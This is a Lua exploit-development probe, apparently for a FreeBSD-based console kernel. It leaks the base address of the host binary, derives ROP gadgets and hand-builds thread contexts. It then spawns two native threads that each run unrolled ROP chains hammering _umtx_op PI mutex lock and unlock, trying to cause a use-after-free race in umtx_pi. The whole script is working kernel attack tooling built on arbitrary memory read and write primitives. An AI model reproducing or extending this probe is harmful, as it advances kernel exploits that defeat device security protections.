-- CRASH_CLASS: MODERATE
-- PROBE 121b: Native-speed PI mutex race — 2 threads, unrolled ROP
--
-- 121a showed 0 anomalies because Lua is too slow for tight races.
-- Fix: spawn 2 native threads, each doing ~150 PI lock/unlock cycles
-- via unrolled ROP chain. No Lua in the hot path.
--
-- Thread A and B both race lock(5)→unlock(6) on same PI mutex.
-- Each cycle: kernel allocates/frees umtx_pi. 300 total races.
-- If umtx_pi alloc/free races → UAF → crash or corruption.

print("=== PROBE 121b: NATIVE PI RACE ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local mm=mk(477); local tc=mk(430); local sc=mk(454)

-- Eboot gadgets
local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local function gad(off)
    return uint64(string.format("0x%X%08X",ehi,elo+off))
end
local PRSI=gad(0xD77D)
local PRDI=gad(0xC9DFE)
local PRAX=gad(0x992)

-- Allocate region: 2 data pages + 2 threads * (4 stack pages + 1 ctx page) = 12 pages
local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(12*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)
print(string.format("region=0x%X",R))

-- Data (page 0)
local pi_mutex=R             -- PI mutex struct (32 bytes)
local ts=R+0x40              -- nanosleep 999s
local counter_a=R+0x60       -- thread A writes its cycle count here
local counter_b=R+0x68       -- thread B writes its cycle count here
local tb=R+0x80              -- thr_create TID output

z(R, 0x200)
wd(pi_mutex, 0); wd(pi_mutex+4, 0x4) -- PRIO_INHERIT
wq(ts, uint64(999)); wq(ts+8, uint64(0))

-- Thread A: pages 2-5 (4 stack pages) + page 6 (context)
-- Thread B: pages 7-10 (4 stack pages) + page 11 (context)
local stk_a=R+0x4000*2   -- 4 pages = 64KB stack
local ctx_a=R+0x4000*6
local stk_b=R+0x4000*7
local ctx_b=R+0x4000*11

-- Build unrolled ROP chain for lock/unlock cycles
-- Each cycle: PRSI,5, PRAX,454, SA (LOCK) + PRSI,6, PRAX,454, SA (UNLOCK)
-- = 10 qwords = 80 bytes per cycle
-- 4 stack pages = 65536 bytes. Reserve 200 bytes for nanosleep tail.
-- (65536 - 200) / 80 = ~816 cycles. Use 150 to be safe with alignment.
local CYCLES=150

local function build_rop(stk_base)
    local sp=stk_base
    for i=1,CYCLES do
        -- LOCK phase (after first iteration, this re-locks)
        -- First iteration: initial syscall does the first LOCK, so first ROP entry is UNLOCK
        -- Actually: initial syscall = LOCK. So ROP starts with UNLOCK.
        wq(sp,PRSI); sp=sp+8; wq(sp,uint64(6)); sp=sp+8      -- RSI=6 (UNLOCK)
        wq(sp,PRAX); sp=sp+8; wq(sp,uint64(454)); sp=sp+8    -- RAX=454
        wq(sp,SA); sp=sp+8                                     -- syscall(UNLOCK)
        wq(sp,PRSI); sp=sp+8; wq(sp,uint64(5)); sp=sp+8      -- RSI=5 (LOCK)
        wq(sp,PRAX); sp=sp+8; wq(sp,uint64(454)); sp=sp+8    -- RAX=454
        wq(sp,SA); sp=sp+8                                     -- syscall(LOCK)
    end
    -- Final UNLOCK after last LOCK
    wq(sp,PRSI); sp=sp+8; wq(sp,uint64(6)); sp=sp+8
    wq(sp,PRAX); sp=sp+8; wq(sp,uint64(454)); sp=sp+8
    wq(sp,SA); sp=sp+8
    -- nanosleep tail (3 copies)
    for rep=1,3 do
        wq(sp,PRSI); sp=sp+8; wq(sp,uint64(0)); sp=sp+8
        wq(sp,PRDI); sp=sp+8; wq(sp,uint64(ts)); sp=sp+8
        wq(sp,PRAX); sp=sp+8; wq(sp,uint64(240)); sp=sp+8
        wq(sp,SA); sp=sp+8
    end
    return sp-stk_base -- bytes used
end

print("building ROP chains...")
local bytes_a=build_rop(stk_a)
local bytes_b=build_rop(stk_b)
print(string.format("rop_size=%d bytes, %d cycles each", bytes_a, CYCLES))

-- Setup context for thread
local function setup_ctx(ctx, stk)
    z(ctx, 0x200)
    wq(ctx+0x108, uint64(0x480))   -- gate[0]
    wd(ctx+0x0D0, 0)               -- gate[1]
    wq(ctx+0x110, uint64(0x10000)) -- gate[2]
    wq(ctx+0x0C0, uint64(0x43))   -- CS
    wq(ctx+0x100, uint64(0x3B))   -- SS
    wq(ctx+0x0E0, SA)             -- RIP = syscall;ret
    wq(ctx+0x0F8, uint64(stk))   -- RSP
    -- First syscall: _umtx_op(pi_mutex, LOCK=5, 0, 0, 0)
    wq(ctx+0x078, uint64(454))    -- RAX
    wq(ctx+0x048, uint64(pi_mutex)) -- RDI
    wq(ctx+0x050, uint64(5))      -- RSI
    wq(ctx+0x058, uint64(0))      -- RDX
    wq(ctx+0x060, uint64(0))      -- R10
    wq(ctx+0x068, uint64(0))      -- R8
end

-- ============================================================
print("--- SPAWNING RACERS ---")

-- Pre-check: lock/unlock works
local r0=N(sc(uint64(pi_mutex),uint64(5),uint64(0),uint64(0),uint64(0)))
local o0=rd(pi_mutex)
local r1=N(sc(uint64(pi_mutex),uint64(6),uint64(0),uint64(0),uint64(0)))
print(string.format("pre: lock=%d own=0x%X unlock=%d", r0, o0 or 0, r1))

-- Verify mutex is clean
wd(pi_mutex, 0); wd(pi_mutex+4, 0x4)

-- Setup both threads
setup_ctx(ctx_a, stk_a)
setup_ctx(ctx_b, stk_b)

-- Spawn both threads as close together as possible
wq(tb, uint64(0))
local ok_a=pcall(function() tc(uint64(ctx_a), uint64(tb), uint64(0)) end)
local tid_a=rd(tb) or 0

wq(tb, uint64(0))
local ok_b=pcall(function() tc(uint64(ctx_b), uint64(tb), uint64(0)) end)
local tid_b=rd(tb) or 0

print(string.format("A: ok=%s tid=0x%X", tostring(ok_a), tid_a))
print(string.format("B: ok=%s tid=0x%X", tostring(ok_b), tid_b))

-- ============================================================
-- Wait for threads to finish their cycles
-- 150 cycles * 2 syscalls each = 300 syscalls per thread
-- At maybe 1-5µs per syscall = 0.3-1.5ms total
-- Wait 500ms to be safe
print("--- WAITING ---")
local sl500=R+0x100
wq(sl500, uint64(0)); wq(sl500+8, uint64(500000000)) -- 500ms
native.fcall_with_rax(stub, 240, sl500, 0)

-- ============================================================
print("--- POST-RACE CHECK ---")
local own_final=rd(pi_mutex)
local flags_final=rd(pi_mutex+4)
print(string.format("mutex: owner=0x%X flags=0x%X", own_final or 0, flags_final or 0))

-- Check if we're still alive
local c=N(native.fcall_with_rax(stub,20))
print(string.format("canary=%s (pid=%d)", c==pid and "OK" or "FAIL", c))

-- Try lock/unlock again to see if mutex is corrupted
wd(pi_mutex, 0); wd(pi_mutex+4, 0x4)
local r2=N(sc(uint64(pi_mutex),uint64(5),uint64(0),uint64(0),uint64(0)))
local o2=rd(pi_mutex)
local r3=N(sc(uint64(pi_mutex),uint64(6),uint64(0),uint64(0),uint64(0)))
print(string.format("post: lock=%d own=0x%X unlock=%d", r2, o2 or 0, r3))

if own_final~=nil and own_final~=0 then
    print("!!! STALE OWNER — thread may be stuck in kernel")
end

print(string.format("total_cycles=%d per_thread=%d", CYCLES*2, CYCLES))
print("=== 121b COMPLETE ===")
